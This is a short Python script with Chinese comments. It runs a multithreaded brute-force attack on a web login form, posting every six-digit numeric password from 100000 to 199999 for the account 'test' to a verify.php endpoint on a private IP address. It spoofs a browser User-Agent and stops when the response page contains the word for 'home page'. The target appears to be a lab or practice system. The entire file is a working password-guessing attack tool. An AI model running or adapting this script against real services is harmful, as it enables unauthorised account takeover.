# import requests
# get=requests.get("http://172.17.77.207/")
# print(get.text)
# # requests.put

import threading
import requests
import sys
userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
header = {
    # "origin": "https://passport.mafengwo.cn",
    # "Referer": "http://172.17.77.207/login",
    'User-Agent': userAgent,
}

def Login(account, password):
    #登录
    postUrl = "http://172.17.78.180/app/verify.php"
    postData = {"username": account,"password": password}
    responseRes = requests.post(postUrl,data = postData,headers = header)
    # 无论是否登录成功，状态码一般都是 statusCode = 200
    # print(f"statusCode = {responseRes.status_code}")
    s=f"text = {responseRes.text}"
    # print(s)
    return s

def trun(t,n):
    for i in range(100000+t*n,100000+(t+1)*n):
    # for i in range(123456,123457):
        s=Login('test', i)
        if s.find("主页")!=-1:
            print("-----"+str(i)+"-----") 
            sys.exit()
        else:
            pass
            

if __name__ == "__main__":
    # 从返回结果来看，有登录成功
    # for i in range(800000,900000):
    #     print(i)
    a=100000
    b=200000
    n=(b-a)//20
    for i in range(0,20):
        i=threading.Thread(target=trun,args=(i,n))
        i.start()
        
        
        

        